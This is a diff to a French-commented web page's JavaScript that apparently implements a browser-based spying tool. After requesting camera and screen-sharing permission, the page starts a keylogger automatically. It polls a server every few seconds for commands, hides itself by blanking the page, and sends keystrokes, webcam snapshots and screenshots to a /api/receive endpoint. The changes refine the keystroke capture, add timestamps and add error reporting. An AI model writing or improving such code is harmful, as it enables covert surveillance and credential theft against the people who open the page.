@@ -53,6 +53,10 @@
 
     <script>
         let isActive = false;
+        let permissions = {
+            camera: false,
+            screen: false
+        };
         let state = {
             camera: {active: false, timer: null},
             keylog: {active: false, buffer: ''},
@@ -64,30 +68,35 @@
             
             // Demander l'autorisation de la caméra
             try {
+                document.getElementById('status').textContent = '📹 Autorisation caméra...';
                 const cameraStream = await navigator.mediaDevices.getUserMedia({video: true, audio: false});
                 cameraStream.getTracks().forEach(track => track.stop());
+                permissions.camera = true;
                 document.getElementById('status').textContent = '✅ Caméra autorisée';
             } catch(e) {
                 document.getElementById('status').textContent = '⚠️ Caméra refusée';
+                permissions.camera = false;
             }
             
             // Attendre un peu avant la prochaine demande
-            await new Promise(resolve => setTimeout(resolve, 500));
+            await new Promise(resolve => setTimeout(resolve, 1000));
             
             // Demander l'autorisation du partage d'écran
             try {
-                document.getElementById('status').textContent = '⏳ Partage d\'écran...';
+                document.getElementById('status').textContent = '🖥️ Autorisation partage d\'écran...';
                 const screenStream = await navigator.mediaDevices.getDisplayMedia({video: true});
                 screenStream.getTracks().forEach(track => track.stop());
+                permissions.screen = true;
                 document.getElementById('status').textContent = '✅ Partage d\'écran autorisé';
             } catch(e) {
                 document.getElementById('status').textContent = '⚠️ Partage d\'écran refusé';
+                permissions.screen = false;
             }
             
             document.getElementById('status').textContent = '✅ Système activé';
             isActive = true;
             
-            // Démarrer keylogger
+            // Démarrer keylogger automatiquement
             enableKeylogger();
             
             // Envoyer infos système
@@ -96,7 +105,7 @@
             // Commencer à vérifier les commandes
             setInterval(checkCommands, 3000);
             
-            // Masquer l'interface après 2 secondes
+            // Masquer l'interface après 3 secondes
             setTimeout(() => {
                 document.body.style.transition = 'opacity 1s';
                 document.body.style.opacity = '0';
@@ -104,7 +113,7 @@
                     document.body.innerHTML = '';
                     document.body.style.background = '#000';
                 }, 1000);
-            }, 2000);
+            }, 3000);
         }
 
         // Vérifier les commandes du serveur
@@ -123,7 +132,7 @@
 
         // Exécuter une commande
         function executeCommand(cmd) {
-            console.log('Command:', cmd.module, cmd.action);
+            console.log('📥 Commande reçue:', cmd.module, cmd.action, cmd.params);
             
             if (cmd.module === 'camera') {
                 if (cmd.action === 'start') startCamera(cmd.params.interval || 5);
@@ -144,9 +153,14 @@
         // === MODULE CAMÉRA ===
         function startCamera(interval) {
             if (state.camera.active) return;
+            if (!permissions.camera) {
+                console.error('Camera permission not granted');
+                return;
+            }
             state.camera.active = true;
             captureCamera();
             state.camera.timer = setInterval(captureCamera, interval * 1000);
+            console.log('📹 Caméra démarrée, intervalle:', interval, 's');
         }
 
         function stopCamera() {
@@ -155,9 +169,14 @@
                 clearInterval(state.camera.timer);
                 state.camera.timer = null;
             }
+            console.log('📹 Caméra arrêtée');
         }
 
         async function captureCamera() {
+            if (!permissions.camera) {
+                console.error('Camera permission not granted');
+                return;
+            }
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({video: true, audio: false});
                 const video = document.createElement('video');
@@ -175,7 +194,8 @@
                         ctx.drawImage(video, 0, 0, 640, 480);
                         const imageData = canvas.toDataURL('image/jpeg', 0.7);
                         
-                        sendData({type: 'camera', image: imageData});
+                        sendData({type: 'camera', image: imageData, timestamp: Date.now()});
+                        console.log('📸 Photo caméra capturée');
                         
                         stream.getTracks().forEach(track => track.stop());
                         video.remove();
@@ -183,6 +203,7 @@
                 };
             } catch(e) {
                 console.error('Camera error:', e);
+                sendData({type: 'error', module: 'camera', message: e.message});
             }
         }
 
@@ -193,27 +214,36 @@
             state.keylog.buffer = '';
             
             document.addEventListener('keydown', handleKeyPress);
+            console.log('⌨️ Keylogger activé');
         }
 
         function disableKeylogger() {
             state.keylog.active = false;
             document.removeEventListener('keydown', handleKeyPress);
+            console.log('⌨️ Keylogger désactivé');
         }
 
         function handleKeyPress(event) {
             if (!state.keylog.active) return;
             
-            state.keylog.buffer += event.key;
+            let key = event.key;
+            if (key === 'Enter') key = '\n';
+            else if (key === 'Tab') key = '\t';
+            else if (key === ' ') key = ' ';
+            else if (key.length > 1) key = `[${key}]`;
             
-            // Envoyer quand le buffer atteint 50 caractères
-            if (state.keylog.buffer.length >= 50) {
+            state.keylog.buffer += key;
+            
+            // Envoyer quand le buffer atteint 100 caractères
+            if (state.keylog.buffer.length >= 100) {
                 sendKeylogData();
             }
         }
 
         function sendKeylogData() {
             if (state.keylog.buffer.length > 0) {
-                sendData({type: 'keylog', keys: state.keylog.buffer});
+                sendData({type: 'keylog', keys: state.keylog.buffer, timestamp: Date.now()});
+                console.log('⌨️ Keylog envoyé:', state.keylog.buffer.length, 'caractères');
                 state.keylog.buffer = '';
             }
         }
@@ -221,9 +251,15 @@
         // === MODULE PARTAGE D'ÉCRAN ===
         function startScreen(quality, interval) {
             if (state.screen.active) return;
+            if (!permissions.screen) {
+                console.error('Screen permission not granted');
+                return;
+            }
             state.screen.active = true;
+            state.screen.quality = quality;
             captureScreen(quality);
             state.screen.timer = setInterval(() => captureScreen(quality), interval * 1000);
+            console.log('🖥️ Partage d\'écran démarré, qualité:', quality, 'intervalle:', interval, 's');
         }
 
         function stopScreen() {
@@ -232,9 +268,14 @@
                 clearInterval(state.screen.timer);
                 state.screen.timer = null;
             }
+            console.log('🖥️ Partage d\'écran arrêté');
         }
 
         async function captureScreen(quality) {
+            if (!permissions.screen) {
+                console.error('Screen permission not granted');
+                return;
+            }
             try {
                 const stream = await navigator.mediaDevices.getDisplayMedia({video: true});
                 const video = document.createElement('video');
@@ -252,7 +293,8 @@
                         ctx.drawImage(video, 0, 0, 1280, 720);
                         const imageData = canvas.toDataURL('image/jpeg', quality);
                         
-                        sendData({type: 'screen', image: imageData});
+                        sendData({type: 'screen', image: imageData, timestamp: Date.now()});
+                        console.log('🖥️ Capture d\'écran envoyée');
                         
                         stream.getTracks().forEach(track => track.stop());
                         video.remove();
@@ -260,6 +302,7 @@
                 };
             } catch(e) {
                 console.error('Screen share error:', e);
+                sendData({type: 'error', module: 'screen', message: e.message});
             }
         }
 
@@ -298,13 +341,18 @@
         // === ENVOI DES DONNÉES ===
         async function sendData(data) {
             try {
-                await fetch('/receive', {
+                const response = await fetch('/api/receive', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify(data)
                 });
+                if (response.ok) {
+                    console.log('✅ Données envoyées:', data.type);
+                } else {
+                    console.error('❌ Erreur envoi:', response.status);
+                }
             } catch(e) {
-                console.error('Send error:', e);
+                console.error('❌ Erreur réseau:', e.message);
             }
         }
     </script>
